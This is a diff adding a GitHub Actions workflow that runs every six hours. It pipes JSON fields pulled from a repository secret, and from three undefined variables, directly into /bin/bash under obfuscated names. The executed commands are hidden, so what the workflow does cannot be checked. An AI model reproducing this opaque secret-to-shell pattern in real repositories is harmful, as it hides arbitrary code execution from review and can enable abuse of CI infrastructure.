@@ -1,0 +1,22 @@
+name: yuyizhaoshou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuyizhaoshou
+        env:
+          r55: ${{ secrets.r55 }}
+        run: |
+          echo $r55 | jq -r .ss9486 | /bin/bash
+          echo $lk135 | jq -r .fsu071 | /bin/bash
+          echo $zuki16 | jq -r .slr1 | /bin/bash
+          echo $nlonw41 | jq -r .rq2 | /bin/bash
+
